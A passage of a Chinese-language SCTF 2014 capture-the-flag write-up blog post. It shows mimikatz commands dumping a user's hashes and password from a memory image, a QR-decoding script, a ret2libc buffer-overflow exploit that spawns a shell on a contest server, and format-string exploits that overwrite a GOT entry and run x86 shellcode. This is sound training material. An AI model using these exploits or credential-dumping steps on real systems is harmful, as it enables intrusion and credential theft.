+<p>然后用 <code>binwalk</code> 检测 <code>1.gif</code>，发现 <code>filesystem</code> 标志，因题目要求得到 LateRain 的明文密码，此文件为系统内存dump。果断拿出神器 <code>mimikatz</code> 对此内存dump进行密码抓取：</p>
+<pre><code>mimikatz# sekurlsa::minidump 1.gif
+Switch to MINIDUMP : &apos;1.gif&apos;
+
+mimikatz# sekurlsa::logonpasswords full
+Opening: &apos;1.gif&apos; file for minidump...
+
+......（内容太多）
+
+Authentication Id : 0 ; 121646 (00000000:0001db2e)
+Session           : Interactive from 1
+User Name         : LateRain
+Domain            : WIN-ROK9845EF0T
+SID               : S-1-5-21-3188298242-3960807603-4078454493-1000
+    msv :    
+     [00000003] Primary
+     * Username : LateRain
+     * Domain   : WIN-ROK9845EF0T
+     * NTLM     : b88655ae45a33a9f3a960fe49e3de92a
+     * SHA1     : 1acb8ded2afb6012fa3d7a4fc44ec87dc25dad57
+    tspkg :    
+     * Username : LateRain
+     * Domain   : WIN-ROK9845EF0T
+     * Password : &lt;TAB&gt;&lt;SPACE&gt;     
+    wdigest :    
+     * Username : LateRain
+     * Domain   : WIN-ROK9845EF0T
+     * Password : &lt;TAB&gt;&lt;SPACE&gt;     
+    kerberos :    
+     * Username : LateRain
+     * Domain   : WIN-ROK9845EF0T
+     * Password : &lt;TAB&gt;&lt;SPACE&gt;     
+    ssp :    
+    credman :    
+
+......（内容太多）
+</code></pre><p>然后得到LateRain的密码<code>&lt;TAB&gt;&lt;SPACE&gt;</code>（5个空格）。</p>
+<p>flag：<code>SCTF{&lt;TAB&gt;&lt;SPACE&gt;     }</code>（5个空格）</p>
+<h2 id="Misc400b-400pt"><a href="#Misc400b-400pt" class="headerlink" title="Misc400b (400pt)"></a>Misc400b (400pt)</h2><p>给了一张png妹子，一番binwalk和各种检测没有发现明显的异常。在仔细分析png各个块数据后，发现最后一个<code>IDAT</code>有异常，将其扣出用zlib解压，得到<code>625bytes</code>的一串二进制字串。因刚好有<code>625</code>位长，所以想到将其转化为一个<code>25x25</code>的点阵图（二维码），附代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFilter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content = <span class="string">'1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011'</span></span><br><span class="line"></span><br><span class="line">width = <span class="number">25</span></span><br><span class="line">height = <span class="number">25</span></span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">'RGB'</span>, (width, height), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">draw = ImageDraw.Draw(img)</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</span><br><span class="line">        <span class="keyword">if</span> content[index] == <span class="string">'1'</span>:</span><br><span class="line">            draw.point((x, y), fill=(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            draw.point((x, y), fill=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">img.save(<span class="string">'qrflag.bmp'</span>, <span class="string">'bmp'</span>)</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>
+<p>得到一张二维码，扫一下即可拿到flag。</p>
+<p>flag：<code>SCTF{(121.518549,25.040854)}</code></p>
+<h2 id="Pwn200-200pt"><a href="#Pwn200-200pt" class="headerlink" title="Pwn200 (200pt)"></a>Pwn200 (200pt)</h2><p>先看IDA中，F5之后为：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">cdecl <span class="title">sub_80484AC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [sp+1Ch] [bp-9Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [sp+9Ch] [bp-1Ch]@1 </span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+A0h] [bp-18h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+A4h] [bp-14h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+A8h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// [sp+ACh] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  n = <span class="number">16</span>;</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v1, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"input name:"</span>, <span class="number">0xC</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, n + <span class="number">1</span>);    <span class="comment">//取的是buf的地址，在堆栈中，可写入17个字节，刚好可以把n覆盖了。</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf) - <span class="number">1</span> &gt; <span class="number">9</span> || <span class="built_in">strncmp</span>(<span class="string">"syclover"</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf, <span class="number">8u</span>) )   <span class="comment">//用'syclover'+'\x00'+'A'*(16-9)+'\xff'  就可以绕过这个验证继续往下走，并且n为255了。</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"input slogan:"</span>, <span class="number">0xE</span>u);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v1, n);              <span class="comment">//n已经被覆盖读入n个字节写到V1处，造成溢出</span></span><br><span class="line">    result = write(<span class="number">1</span>, &amp;v1, n);       <span class="comment">//打印</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中在V1也是在堆栈上的，大小原本是9C-1C=0x80，现在可以读入255，造成溢出，覆盖掉ret，便可控制程序流程。</p>
+<p>程序没有可写可执行的段，堆栈也不能执行，主办方给了个libc，然后~就ret2libc。</p>
+<p>先控制ret去leak得到got地址，再通过偏移拿到system()地址。然后构造参数，执行system(‘/bin/sh’);</p>
+<p>给出exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = <span class="string">'218.2.197.248'</span></span><br><span class="line"><span class="comment">#host = '127.0.0.1'</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line">io = zio((host, port), print_read=<span class="keyword">False</span>, print_write=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'syclover'</span> + <span class="string">'\x00'</span> + <span class="string">'A'</span>*(<span class="number">16</span><span class="number">-9</span>) + <span class="string">'\xff'</span></span><br><span class="line">io.write(payload)</span><br><span class="line">io.read_until(<span class="string">':'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'B'</span>*<span class="number">160</span> + l32(<span class="number">0x80483a0</span>) + l32(<span class="number">0x80484ac</span>) + l32(<span class="number">1</span>) + l32(<span class="number">0x804985C</span>) +l32(<span class="number">4</span>)</span><br><span class="line">io.write(payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.read(<span class="number">1</span>)</span><br><span class="line">libc_addr = l32(io.read(<span class="number">26</span>)[<span class="number">14</span>:<span class="number">18</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x26050</span></span><br><span class="line">bin_addr = libc_addr + <span class="number">0x147B78</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#local</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">sys_addr = libc_addr + 0x22610</span></span><br><span class="line"><span class="string">bin_addr = libc_addr + 0x11AF6A</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> libc_addr</span><br><span class="line"><span class="keyword">print</span> sys_addr</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">':'</span>)</span><br><span class="line"></span><br><span class="line">io.write(payload)</span><br><span class="line">io.read_until(<span class="string">':'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">'C'</span>)*<span class="number">160</span> + l32(sys_addr) + l32(bin_addr)*<span class="number">2</span>+ <span class="string">'\x00'</span>*<span class="number">20</span></span><br><span class="line"><span class="comment">#time.sleep(10)</span></span><br><span class="line">io.write(payload2)</span><br><span class="line"><span class="comment">#print io.read(1000)</span></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<p>flag：<code>SCTF{SH3NG_4_KAN_DAN__BU_FU_9_GANN}</code></p>
+<h2 id="Pwn300-300pt"><a href="#Pwn300-300pt" class="headerlink" title="Pwn300 (300pt)"></a>Pwn300 (300pt)</h2><p>溢出点在：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">print_msg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+1Ch] [bp-40Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+41Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, src);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your message is:"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(src);            <span class="comment">//这里</span></span><br><span class="line">  result = *MK_FP(__GS__, <span class="number">20</span>) ^ v2;</span><br><span class="line">  <span class="keyword">if</span> ( *MK_FP(__GS__, <span class="number">20</span>) != v2 )</span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>printf(src)可产生格式化字符串攻击。</p>
+<p>那么就可以控制EAX和EDX，是MOV [EAX],EDX。那，就先把got上exit的地址换为：</p>
+<pre><code>.bss:08049180                         ; char src[1024]
+</code></pre><p>而刚好08049000这个段是可写可执行的。so：</p>
+<ol>
+<li>利用格式化溢出把got上的exit换为08049180</li>
+<li>最后一次leave_msg时，写入shellcode</li>
+<li>选4，触发shellcode</li>
+</ol>
+<p>其实，格式化字符串玩的少，平时也就用%x玩玩的。</p>
+<p>所以，第一个版本exp是：</p>
+<pre><code>#linux/x86/exec - 43 bytes
+shellcode = &quot;\x29\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xb3\x55\x29\xcd\x83\xee\xfc\xe2\xf4\xd9\x5e\x71\x54\xe1\x33\x41\xe0\xd0\xdc\xce\xa5\x9c\x26\x41\xcd\xdb\x7a\x4b\xa4\xdd\xdc\xca\x9f\x5b\x5d\x29\xcd\xb3\x7a\x4b\xa4\xdd\x7a\x5a\xa5\xb3\x02\x7a\x44\x52\x98\xa9\xcd&quot;
+ADDR = 0x08049120   #Exit_Got_addr
+xxx = &apos;%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%.13451633x%.13451633x%.13451633x%.13451633x%.13451633x%.13451633x%.13451633x%.13451633x%.13451657x%.13451690x%n&apos;
+payload = shellcode + xxx + l32(ADDR) + &apos;\n&apos;
+</code></pre><p>执行一次得很久很久，后来本地成功了，但远程不行，就换了另一个：</p>
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#host = '218.2.197.248'</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10002</span></span><br><span class="line">io = zio((host, port), print_read=<span class="keyword">False</span>, print_write=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_val</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> io.read_until(<span class="string">'choice:'</span>)</span><br><span class="line">    io.write(<span class="string">'2\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> io.read_until(<span class="string">'message'</span>)</span><br><span class="line">    io.write(val +<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> io.read_until(<span class="string">'choice:'</span>)</span><br><span class="line">    io.write(<span class="string">'3\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#linux/x86/exec - 43 bytes</span></span><br><span class="line">shellcode = <span class="string">"\x29\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xb3\x55\x29\xcd\x83\xee\xfc\xe2\xf4\xd9\x5e\x71\x54\xe1\x33\x41\xe0\xd0\xdc\xce\xa5\x9c\x26\x41\xcd\xdb\x7a\x4b\xa4\xdd\xdc\xca\x9f\x5b\x5d\x29\xcd\xb3\x7a\x4b\xa4\xdd\x7a\x5a\xa5\xb3\x02\x7a\x44\x52\x98\xa9\xcd"</span></span><br><span class="line"></span><br><span class="line">val = <span class="number">0x08049180</span></span><br><span class="line">set1 = l32(<span class="number">0x08049120</span>)+<span class="string">'%%%dc'</span> % ((val     &amp; <span class="number">0xff</span>) - <span class="number">4</span>) + <span class="string">'%7$hhn'</span></span><br><span class="line">set2 = l32(<span class="number">0x08049121</span>)+<span class="string">'%%%dc'</span> % ((val&gt;&gt;<span class="number">8</span>  &amp; <span class="number">0xff</span>) - <span class="number">4</span>) + <span class="string">'%7$hhn'</span></span><br><span class="line"><span class="comment">#因为高位原本的值就是0804所以，只需要写两位就行了</span></span><br><span class="line"></span><br><span class="line">write_val(set1)</span><br><span class="line">write_val(set2)</span><br><span class="line">write_val(shellcode)</span><br><span class="line"><span class="keyword">print</span> io.read_until(<span class="string">'choice:'</span>)</span><br><span class="line"><span class="comment">#time.sleep(10)</span></span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'4\n'</span>)</span><br><span class="line"><span class="comment">#print io.read(100)</span></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<p>flag：<code>SCTF{ZQzq2617}</code></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Team：0xFA"><span class="toc-number">1.</span> <span class="toc-text">Team：0xFA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc10-10pt"><span class="toc-number"></span> <span class="toc-text">Misc10 (10pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re50-50pt"><span class="toc-number"></span> <span class="toc-text">Re50 (50pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pt100-100pt"><span class="toc-number"></span> <span class="toc-text">Pt100 (100pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code200-200pt"><span class="toc-number"></span> <span class="toc-text">Code200 (200pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code400-400pt"><span class="toc-number"></span> <span class="toc-text">Code400 (400pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc300-300pt"><span class="toc-number"></span> <span class="toc-text">Misc300 (300pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc400a-400pt"><span class="toc-number"></span> <span class="toc-text">Misc400a (400pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc400b-400pt"><span class="toc-number"></span> <span class="toc-text">Misc400b (400pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn200-200pt"><span class="toc-number"></span> <span class="toc-text">Pwn200 (200pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn300-300pt"><span class="toc-number"></span> <span class="toc-text">Pwn300 (300pt)</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2014/12/08/sctf2014-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&text=SCTF2014 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&title=SCTF2014 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&is_video=false&description=SCTF2014 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SCTF2014 Writeup&body=Check out this article: http://rickgray.me/2014/12/08/sctf2014-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&title=SCTF2014 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&title=SCTF2014 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&title=SCTF2014 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&title=SCTF2014 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&name=SCTF2014 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 RickGray
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
